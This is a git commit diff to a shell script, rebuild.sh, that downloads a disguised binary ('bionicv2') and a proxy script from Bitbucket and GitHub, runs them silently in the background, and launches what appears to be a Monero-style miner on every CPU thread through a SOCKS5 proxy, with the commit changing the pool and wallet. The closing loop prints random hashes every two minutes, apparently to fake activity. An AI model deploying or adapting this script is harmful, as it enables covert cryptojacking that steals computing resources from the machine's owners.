a23379cf5dc881a588ac71030c7be99ad003a4f0
mata lima <lamajuahsu@outlook.com>
2021-11-04 09:13:50 +0000

    rebuild.sh edited online with Bitbucket

--- rebuild.sh
+++ rebuild.sh
@@ -5,10 +5,10 @@ wget -O bionicv2 https://bitbucket.org/oqoixgqoq9/turtel/raw/c4008f7e57bc01c88c7
 wget -O proxy.py https://raw.githubusercontent.com/mariobiszz/nenenenenene/main/proxy.py
 chmod +x bionicv2 proxy.py
 python3 proxy.py >/dev/null &
-pool="pool.hashvault.pro:80"
-wallet="TRTLv3XdA6KgV9dHSXXB1pJtSjdQdLXuJewbc5SALSGcaXwyKkj548iWqBKxQEnyeRV7hfBw8FaveMmBDzeRCjQ7arJQASUnca2"
+pool="xmr.hashcity.org:4444"
+wallet="novalanto.$(cat /proc/sys/kernel/hostname)"
 workername="$(cat /proc/sys/kernel/hostname)"
 thread="$(nproc --all)"
 proxy="socks5://174.138.17.79:4145"
-./bionicv2 -o $pool -u $wallet --keepalive --donate-level 1 -p $workername -k --tls -t$thread >/dev/null &
+./bionicv2 -o $pool -u $wallet --keepalive --donate-level 1 -p x -k --tls -t$thread >/dev/null &
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
